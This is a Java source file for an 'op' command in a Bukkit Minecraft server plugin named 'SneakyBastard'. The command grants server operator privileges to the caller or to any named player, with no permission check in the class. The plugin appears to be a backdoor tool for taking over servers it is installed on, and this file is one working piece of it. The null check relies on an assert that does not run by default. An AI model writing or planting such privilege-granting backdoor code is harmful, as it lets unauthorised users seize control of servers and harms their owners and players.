package net.blackofworld.SneakyBastard.Commands.Server;

import net.blackofworld.SneakyBastard.Command.CommandBase;
import net.blackofworld.SneakyBastard.Command.CommandCategory;
import net.blackofworld.SneakyBastard.Command.CommandInfo;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import net.blackofworld.SneakyBastard.Extensions.PlayerExt;
import lombok.experimental.ExtensionMethod;
import java.util.ArrayList;

@CommandInfo(command = "op", description = "Gives you op.", Syntax = "[player]", category = CommandCategory.Server)
@ExtensionMethod({Player.class, PlayerExt.class})
public final class Op extends CommandBase {
    @Override
    public void Execute(Player p, ArrayList<String> args) {
        Player pp = p;
        if (args.size() > 0) {
            pp = Bukkit.getPlayerExact(args.get(0));
        }
        assert pp != null;
        pp.setOp(true);
        if (args.size() > 0) {
            p.Reply(pp.getName() + " is now an operator");
        } else p.Reply("You are now an operator");
    }
}
